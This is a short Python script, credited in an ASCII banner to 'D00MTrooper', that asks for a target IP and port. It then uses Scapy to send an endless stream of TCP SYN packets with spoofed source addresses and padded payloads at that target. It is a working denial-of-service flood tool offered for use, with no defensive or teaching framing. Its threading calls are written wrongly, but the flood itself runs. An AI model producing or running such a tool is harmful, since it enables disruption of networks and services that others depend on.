from scapy.all import *

def send_packet(target_ip, target_port):
    ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)

if __name__ == "__main__":
    while True:
        print(f"  /$$$$$$  /$$     /$$ /$$   /$$        /$$$$$$$$ /$$                           /$$")
        print(f" /$$__  $$|  $$   /$$/| $$$ | $$       | $$_____/| $$                          | $$")
        print(f"| $$  \__/ \  $$ /$$/ | $$$$| $$       | $$      | $$  /$$$$$$   /$$$$$$   /$$$$$$$")
        print(f"|  $$$$$$   \  $$$$/  | $$ $$ $$       | $$$$$   | $$ /$$__  $$ /$$__  $$ /$$__  $$")
        print(f" \____  $$   \  $$/   | $$  $$$$       | $$__/   | $$| $$  \ $$| $$  \ $$| $$  | $$")
        print(f" /$$  \ $$    | $$    | $$\  $$$       | $$      | $$| $$  | $$| $$  | $$| $$  | $$")
        print(f"|  $$$$$$/    | $$    | $$ \  $$       | $$      | $$|  $$$$$$/|  $$$$$$/|  $$$$$$$")
        print(f" \______/     |__/    |__/  \__//$$$$$$|__/      |__/ \______/  \______/  \_______/")
        print(f"                               |______/                                            made by D00MTrooper ")

        target_ip = input("Choose IP: ")
        target_port = int(input("Choose port: "))

        print(f"Atack started")

        thread1 = threading.Thread(target=send_packet(target_ip, target_port))
        thread1.start()

        thread2 = threading.Thread(target=send_packet(target_ip, target_port))
        thread2.start()

        thread3 = threading.Thread(target=send_packet(target_ip, target_port))
        thread3.start()
